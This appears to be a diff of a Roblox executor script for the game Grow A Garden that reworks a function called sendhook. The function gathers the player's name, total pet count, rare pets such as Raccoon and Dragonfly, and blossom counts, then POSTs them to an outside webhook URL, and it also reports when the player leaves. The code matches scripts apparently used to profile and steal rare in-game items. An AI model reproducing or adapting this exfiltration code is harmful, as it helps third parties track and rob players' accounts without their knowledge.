@@ -109,48 +109,42 @@ if PlaceId == 126884695634066 then
     end
 
     local function sendhook()
-        local httprequest = (syn and syn.request) or (http and http.request) or http_request or request
-        if not httprequest or not getgenv().WebHookURL then return end
-
-        local moon, candy = CheckBlossoms()
-        local pets = collectPetInfo()
-        local totalPets = #pets
-        local targetPets = {}
-        local targetTypes = {"Raccoon", "Butterfly", "Dragonfly", "Red Fox", "Mimic Octopus", "Fennec Fox"}
-
-        for _, pet in ipairs(pets) do
-            for _, targetType in ipairs(targetTypes) do
-                if pet.type:find(targetType) then
-                    table.insert(targetPets, string.format("%s (Lv.%d)", pet.type, pet.level))
-                    break
+            local httprequest = (syn and syn.request) or (http and http.request) or http_request or request
+            if not httprequest or not getgenv().WebHookURL then return end
+        
+            local moon, candy = CheckBlossoms()
+            local pets = collectPetInfo()
+            local totalPets = #pets
+            local targetPets = {}
+            local targetTypes = {"Raccoon", "Butterfly", "Dragonfly", "Red Fox", "Mimic Octopus", "Fennec Fox"}
+        
+            for _, pet in ipairs(pets) do
+                for _, targetType in ipairs(targetTypes) do
+                    if pet.type:find(targetType) then
+                        table.insert(targetPets, string.format("%s (Lv.%d)", pet.type, pet.level))
+                        break
+                    end
                 end
             end
+        
+            local petMessage = #targetPets > 0 and table.concat(targetPets, ", ") or "None"
+            local message = string.format(
+                "Pets: %d | Rare Pets: %s | Moon Blossom: %d | Candy Blossom: %d",
+                totalPets,
+                petMessage,
+                moon,
+                candy
+            )
+        
+            print(message)
+        
+            httprequest({
+                Url = getgenv().WebHookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({username = LocalPlayer.Name, content = message, type='inventory', game='Grow A Garden'})
+            })
         end
-
-        local petMessage = #targetPets > 0 and table.concat(targetPets, ", ") or "Doesnt have"
-        local blossomMessage = string.format("\n🌙 Moon Blossom: %d\n🍬 Candy Blossom: %d", moon, candy)
-
-        local message = string.format(
-            "🌟 Pet Alert From GAG! 🌟\n"..
-            "Name: %s\n"..
-            "Rare Pets(Raccon, Dragonfly, Butterfly): %s\n"..
-            "Pets Count: %d%s",
-            LocalPlayer.Name,
-            petMessage,
-            totalPets,
-            blossomMessage
-        )
-
-        print(message)
-
-        httprequest({
-            Url = getgenv().WebHookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({username = LocalPlayer.Name, content = message, type='inventory', game='Grow A Garden'})
-        })
-    end
-
     sendhook()
     sendWebhook(LocalPlayer.Name, "lefted", 'left')
 
